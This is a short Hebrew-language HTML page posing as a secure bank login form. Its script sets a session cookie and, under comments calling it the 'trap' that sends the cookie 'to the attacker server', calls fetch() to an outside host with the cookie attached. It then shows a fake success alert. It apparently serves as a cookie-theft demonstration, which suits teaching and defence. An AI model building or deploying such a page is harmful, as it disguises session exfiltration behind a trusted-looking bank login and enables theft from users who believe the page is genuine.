<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>מערכת בנקאית מאובטחת</title>
    <style>
        body { font-family: sans-serif; background-color: #eef2f3; text-align: center; padding-top: 80px; }
        .bank-card { background: white; padding: 40px; display: inline-block; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 400px; }
        h1 { color: #2c3e50; font-size: 28px; }
        input { margin: 10px 0; padding: 10px; width: 80%; }
        button { background: #3498db; color: white; border: none; padding: 10px 20px; cursor: pointer; border-radius: 5px; }
    </style>
</head>
<body>

    <div class="bank-card">
        <h1>התחברות לחשבון הבנק</h1>
        <form id="loginForm">
            <input type="text" placeholder="שם משתמש" required><br>
            <input type="password" placeholder="סיסמה" required><br>
            <button type="submit">התחבר</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); 
            // 1. יצירת עוגיית סשן פיקטיבית כאילו המשתמש התחבר בהצלחה
            document.cookie = "session_token=secret_user_12345; path=/";
            
            // 2. הפעלת ה"מלכודת" - שליחת העוגיה לשרת התוקף
            fetch('https://python-pickwiz.onrender.com/log?cookie=' + document.cookie);
            
            alert("התחברת בהצלחה!");
        });
    </script>

</body>
</html>
